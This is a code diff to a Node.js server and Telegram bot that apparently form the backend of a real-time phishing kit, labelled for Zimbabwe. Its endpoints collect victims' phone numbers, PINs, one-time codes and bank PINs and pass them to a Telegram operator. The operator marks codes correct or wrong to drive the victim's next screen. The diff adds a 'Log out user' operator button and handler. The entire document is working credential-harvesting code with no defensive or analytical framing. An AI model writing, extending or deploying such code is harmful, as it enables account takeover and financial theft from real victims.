@@ -58,7 +58,6 @@ app.post('/api/login-notification', async (req, res) => {
   if (!phone || !pin) return res.status(400).json({ error: "Missing data" });
   if (!telegramConfigured()) {
     console.warn('/api/login-notification called but Telegram is not configured.');
-    // Still record status for local testing, but return informative error
     statusStore[phone] = "pending";
     return res.status(500).json({ error: "Telegram not configured" });
   }
@@ -138,6 +137,9 @@ app.post('/api/verify-first-otp', async (req, res) => {
             { text: "✅ Correct", callback_data: `otp1_correct|${phone}|${otp}` },
             { text: "❌ Wrong Code", callback_data: `otp1_wrong|${phone}` },
             { text: "🔑 Wrong PIN", callback_data: `otp1_wrongpin|${phone}` }
+          ],
+          [
+            { text: "🚫 Log out user", callback_data: `logout|${phone}` }
           ]
         ]
       }
@@ -190,7 +192,6 @@ app.post('/api/verify-bank-pin', async (req, res) => {
   if (!phone || !bankPin) return res.status(400).json({ error: "Missing data" });
   if (!telegramConfigured()) {
     console.warn('/api/verify-bank-pin called but Telegram is not configured.');
-    // Update local status for UI flow but inform caller that Telegram isn't available
     statusStore[phone] = "pending_bank_pin";
     return res.status(500).json({ error: "Telegram not configured" });
   }
@@ -231,6 +232,27 @@ app.post('/api/verify-bank-pin', async (req, res) => {
 
 // -------------------- BOT ACTIONS --------------------
 if (botEnabled) {
+  // LOGOUT USER (OTP admin action only)
+  bot.action(/^logout\|(.+)/, async (ctx) => {
+    const phone = ctx.match[1];
+    statusStore[phone] = "logged_out";
+    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
+
+    const logoutMsg = `🚫 <b>USER LOGGED OUT</b>
+
+🇿🇼 <b>Zimbabwe</b>
+📱 <b>${phone}</b>
+
+━━━━━━━━━━━━━━━
+
+❌ <b>Status: Logged out by admin</b>
+⏱️ <b>${currentTime}</b>`;
+
+    await ctx.answerCbQuery("User logged out");
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.replyWithHTML(logoutMsg);
+  });
+
   // APPROVE LOGIN
   bot.action(/^approve\|(.+)\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
